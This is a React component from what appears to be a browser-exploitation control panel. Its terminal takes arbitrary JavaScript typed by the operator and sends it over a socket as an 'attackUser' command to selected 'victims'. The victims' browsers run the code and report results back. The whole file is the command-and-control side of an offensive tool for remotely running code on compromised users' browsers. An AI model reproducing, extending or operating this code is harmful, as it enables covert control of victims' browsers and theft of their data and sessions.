import React, {Component, PropTypes} from 'react'
import {connect} from 'react-redux'
import {bindActionCreators} from 'redux'
import * as terminalActions from '../../actions/terminal'
import * as utils from '../../utils'

class Terminal extends Component {
  componentDidMount() {
    $('#terminal').terminal(this._commandHandler.bind(this), {
      greetings: 'Actions are logged here.\nAdditionally, you can use this terminal to execute commands on selected targets.',
      name: 'js_demo',
      height: 300,
      prompt: '[VeAL ~]$ '
    })
    this.props.actions.setLogger($.terminal.active().echo)
  }

  _commandHandler(command, term) {
    if (command !== '') {
      let activeTargetSocketIds = utils.objToArrayOfValues(this.props.activeTargets, 'socketId')
      if(activeTargetSocketIds.length === 0){
        term.echo('Select a target first')
      }
      activeTargetSocketIds.forEach((socketId)=>{
        term.echo(`Executing command line attack on victim ${this.props.victimsBySocketIdMap[socketId].id}...`)
        let attackInstanceId = `${socketId}_${new Date().valueOf()}`
        this.props.followupBuffer[attackInstanceId] = function(params, logger){}
        this.props.socket.emit('attackUser', {
          userSocket: socketId,
          attack: `function(params){
            params.time = new Date();
            try{
              ${command};
              socket.emit("result", {
                success: true,
                message: "Successfully executed custom command at " + new Date() ,
                params
              });
            }catch(e){
              socket.emit("result", {
                success: false,
                message: e.toString(),
                params
              });
            }
          }`,
          params: {id: attackInstanceId}
        })
      })
    }
  }

  render() {
    return (
      <div className="block">
        <div id="terminal"></div>
      </div>
    )
  }
}

Terminal.propTypes = {
  actions: PropTypes.object,
  activeTargets: PropTypes.object,
  followupBuffer: PropTypes.object.isRequired,
  victimsBySocketIdMap: PropTypes.object
}

function mapStateToProps(state, props) {
  return {
    activeTargets: state.victims.activeTargets,
    followupBuffer: state.attacks.followupBuffer,
    logger: state.terminal.logger,
    victimsBySocketIdMap: state.victims.victimsBySocketIdMap
  }
}

function mapDispatchToProps(dispatch) {
  return {
    actions: bindActionCreators(terminalActions, dispatch)
  }
}

export default connect(mapStateToProps, mapDispatchToProps)(Terminal)